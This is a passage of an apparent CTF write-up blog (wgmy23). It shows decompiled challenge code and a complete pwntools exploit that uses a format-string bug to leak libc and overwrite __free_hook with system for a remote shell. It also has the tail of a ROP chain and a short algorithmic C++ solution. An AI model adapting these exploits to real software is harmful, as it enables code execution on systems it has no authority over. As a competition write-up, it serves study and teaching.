+</span></span><span style="display:flex;"><span>rop  <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span> <span style="color:#ae81ff">37</span> <span style="color:#f92672">+</span> p64(canary) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> ret <span style="color:#f92672">+</span> popRdi <span style="color:#f92672">+</span> p64(next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>))) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;system&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;soon:&#34;</span>,rop)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>
+</details></p>
+
+<h2 id="free-juice-pwn">Free Juice (pwn)<a hidden class="anchor" aria-hidden="true" href="#free-juice-pwn">#</a></h2>
+<p><img loading="lazy" src="/wgmy23/blood3.png" alt="free_juice first blood 🩸"  />
+</p>
+<p><strong>checksec:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>[*] &#39;/home/vagrant/ctf/wgmy23/free_juice/free_juice&#39;
+</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
+</span></span><span style="display:flex;"><span>    Stack:    Canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
+</span></span></code></pre></div>
+
+<p><details >
+  <summary markdown="span"><strong>src.c</strong></summary>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>undefined8 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_c;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">initialize</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">displayMenu</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter your choice: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>,<span style="color:#f92672">&amp;</span>local_c);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (local_c <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">drinkJuices</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (local_c <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (local_c <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">chooseJuices</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> (local_c <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">refillJuices</span>();
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>LAB_00100fff:
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invalid choice. Please try again.&#34;</span>);
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (local_c <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Exiting...&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> (local_c <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x539</span>) <span style="color:#66d9ef">goto</span> LAB_00100fff;
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">secretJuice</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (local_c <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span>( true );
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">chooseJuices</span>(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_c;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">displayAvailableJuices</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter the number of the chosen juice (1-5): &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>,<span style="color:#f92672">&amp;</span>local_c);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((local_c <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">||</span> (<span style="color:#ae81ff">5</span> <span style="color:#f92672">&lt;</span> local_c)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invalid selection. Please try again.&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    chosenJuice <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x114</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (chosenJuice <span style="color:#f92672">==</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;Error allocating memory&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>(chosenJuice,availableJuices <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)(local_c <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x114</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(chosenJuice <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x100</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>DAT_00302120 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)(local_c <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x114</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>(chosenJuice <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x104</span>,s_Orange_00302124 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)(local_c <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x114</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;You chose %s juice.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,chosenJuice);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">displayAvailableJuices</span>(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_c;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Available Juices:&#34;</span>);
+</span></span><span style="display:flex;"><span>  local_c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (local_c <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">5</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d. %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,(ulong)(local_c <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>),availableJuices <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)local_c <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x114</span>);
+</span></span><span style="display:flex;"><span>    local_c <span style="color:#f92672">=</span> local_c <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">refillJuices</span>(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (chosenJuice <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Please choose a juice first.&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter the quantity to refill: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>,chosenJuice <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x100</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Juice refilled!&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">drinkJuices</span>(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (chosenJuice <span style="color:#f92672">==</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Please choose a juice first.&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Enjoy the refreshing experience of your chosen juice. Cheers! &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">putchar</span>(<span style="color:#ae81ff">10</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(chosenJuice);
+</span></span><span style="display:flex;"><span>    chosenJuice <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">secretJuice</span>(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// option 1337
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">long</span> in_FS_OFFSET;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> local_118 [<span style="color:#ae81ff">264</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> local_10;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (chosenJuice <span style="color:#f92672">==</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Please choose a juice first.&#34;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Let us know what juices you need and we will get back to you!&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%256s&#34;</span>,local_118);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Current Juice : &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(local_118);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strncpy</span>(chosenJuice,local_118,<span style="color:#ae81ff">0xff</span>);
+</span></span><span style="display:flex;"><span>    chosenJuice[<span style="color:#ae81ff">0xff</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">putchar</span>(<span style="color:#ae81ff">10</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (local_10 <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__stack_chk_fail</span>();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
+</details></p>
+
+<blockquote>
+<p>libc-2.23.so is given for this chall</p>
+</blockquote>
+<p>This looks like a classic heap pwn challange.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>You can essentially
+</span></span><span style="display:flex;"><span>1. allocate 0x120 chunks
+</span></span><span style="display:flex;"><span>2. free the chunk above wilderness
+</span></span><span style="display:flex;"><span>3. overflow the chunk above wilderness, and leak stuff using option 1337
+</span></span></code></pre></div><p>The only tricky part of this challenge is that you can&rsquo;t free whichever chunk you want, you can only free the chunk above wilderness, which makes us essentially not be able to put any chunk into the bins, since the chunk will consolidate with the wilderness when it is freed.</p>
+<p>These conditions and the libc version made me think of <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_orange.c">House of Orange</a>. Also, the challenge context, specifically &ldquo;Orange juice&rdquo;, confirmed my assumption that the intended solution requires a House of Orange attack.</p>
+<p>We also have all the requirements needed to perform a House of Orange attack.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>1. we have a heap overflow that can overwrite the top chunk
+</span></span><span style="display:flex;"><span>2. we have a libc and heap infoleak using the format string vuln
+</span></span></code></pre></div><p>As I was thinking of how to execute this attack on this challenge, it suddenly came to me, that I can actually just pwn this binary by solely using the format string vuln. I mean think about it, we can use option 1337 as many times as we want, meaning that we can use the format string vuln as many times as we want, meaning we have unlimited arbitary overwrites.</p>
+<blockquote>
+<p>for a short minute I thought this exploit wouldn&rsquo;t work since it reads in strings and I can&rsquo;t write the packed 64 bit address as it contains null bytes, but then I realised you could just put the address at the end of the format string payload. lol</p>
+</blockquote>
+<p>What I did in the end was just leaking libc, and then overwriting <code>__free_hook</code> with <code>system@libc</code>, and writing <code>&quot;/bin/sh&quot;</code> into my juice, and freeing it.</p>
+
+
+<p><details >
+  <summary markdown="span"><strong>exploit.py</strong></summary>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#io = process(&#34;./free_juice&#34;)</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;13.229.222.125&#34;</span>,<span style="color:#ae81ff">33156</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.23.so&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">chooseJuice</span>():
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter your choice:&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;(1-5):&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">secretJuice</span>(a):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter your choice:&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1337&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;you!&#34;</span>,a)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">drinkJuice</span>():
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter your choice:&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chooseJuice()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># leak libc</span>
+</span></span><span style="display:flex;"><span>secretJuice(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%13$p&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">14</span>)<span style="color:#f92672">.</span>decode(),<span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">271</span> <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;__isoc99_scanf&#34;</span>]
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;LIBC BASE: &#34;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># cheese the chall</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># overwrite __free_hook with system</span>
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;system&#34;</span>])[:<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>freehook <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;__free_hook&#34;</span>]
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;system@libc: &#34;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;system&#34;</span>]))
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;__free_hook: &#34;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;__free_hook&#34;</span>]))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> system:
+</span></span><span style="display:flex;"><span>    formatstr  <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%&#34;</span> <span style="color:#f92672">+</span> str(i)<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">3</span>,<span style="color:#e6db74">&#34;0&#34;</span>)<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;c&#34;</span>
+</span></span><span style="display:flex;"><span>    formatstr <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%8$hhn&#34;</span>
+</span></span><span style="display:flex;"><span>    formatstr  <span style="color:#f92672">=</span> formatstr<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">16</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>)
+</span></span><span style="display:flex;"><span>    formatstr <span style="color:#f92672">+=</span> p64(freehook)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>    secretJuice(formatstr)
+</span></span><span style="display:flex;"><span>    freehook <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>secretJuice(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh;&#34;</span>)
+</span></span><span style="display:flex;"><span>drinkJuice()
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>
+</details></p>
+
+<h3 id="alternative-solutions">Alternative solutions<a hidden class="anchor" aria-hidden="true" href="#alternative-solutions">#</a></h3>
+<p>I&rsquo;m pretty sure that the intended solution for this chall is to use a House of Orange attack, so I think I kinda cheesed it lol. But granted that the heap overflow primitive is so strong, and we can leak everything we want, I think the execution of the attack should be quite straighforward, and can be done by just following the <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_orange.c">how2heap House of Orange writeup</a>.</p>
+<blockquote>
+<p>the only part you have to change from the how2heap writeup is prob just the part where it calculates the new wilderness size.</p>
+</blockquote>
+<p>Other ways that I think this chall could be solved:</p>
+<ol>
+<li>Abusing exit handlers (more on this on my <a href="https://zeynarz.github.io/posts/codegate_finals23/#abusing-exit-handlers">previous blog post</a>, and this <a href="https://m101.github.io/binholic/2017/05/20/notes-on-abusing-exit-handlers.html">article</a>)</li>
+<li>Overwriting the jump table ptr in stdin/stdout/stderr. (I&rsquo;m pretty sure this will work since the mitigation that checks the address of the vtable before virtual functions are called is added in gilbc 2.24)</li>
+<li>Copying the exploit strategy of House of Orange, and forge a fake _IO_FILE struct, place it in _IO_list_all using format string vuln, and cause malloc_printerr to run</li>
+</ol>
+<h2 id="linux-memory-usage-ppc">Linux Memory Usage (ppc)<a hidden class="anchor" aria-hidden="true" href="#linux-memory-usage-ppc">#</a></h2>
+<p>The problem simplified was essentially (worded by myself):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>You are given N processes, and you are given its 
+</span></span><span style="display:flex;"><span>1. pid
+</span></span><span style="display:flex;"><span>2. ppid
+</span></span><span style="display:flex;"><span>3. memory used
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>For each query, you have to give the total memory used by the process, which is its own memory used plus all the memory used by its children 
+</span></span></code></pre></div><p>My approach is quite straightforward.<br>
+I made a Process class in cpp, which had the properties <code>pid</code>,<code>ppid</code>,<code>mem</code>, and <code>children</code>, which is a vector.
+I also made a hashmap to store all the Process objects.</p>
+<p>The Process class also has a recursive method called <code>Process.memUsed()</code>, which adds up its own mem used with all the mem its children used. To find the mem used by its children, <code>child.memUsed()</code> is called (which is why I say the method is recursive)</p>
+<p>However, this solution isn&rsquo;t fast enough, and will exceed the limit.<br>
+So to solve this, I made a new property in the Process class called <code>totalmem</code>, and store the value calculated by <code>Process.memUsed()</code> in it.
+This way if <code>memUsed()</code> is called upon the same Process object multiple times, the method won&rsquo;t have to repeatedly find out the total memory, and can just use the value stored in totalmem.</p>
+
+
+<p><details >
+  <summary markdown="span"><strong>solve.cpp</strong></summary>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;bits/stdc++.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> <span style="color:#66d9ef">namespace</span> std;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Process</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> pid;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> ppid;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> mem;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> totalmem <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        vector<span style="color:#f92672">&lt;</span>Process<span style="color:#f92672">*&gt;</span> children;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Process(){
+</span></span><span style="display:flex;"><span>            pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>            ppid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>            mem <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Process(<span style="color:#66d9ef">int</span> a, <span style="color:#66d9ef">int</span> b, <span style="color:#66d9ef">int</span> c){
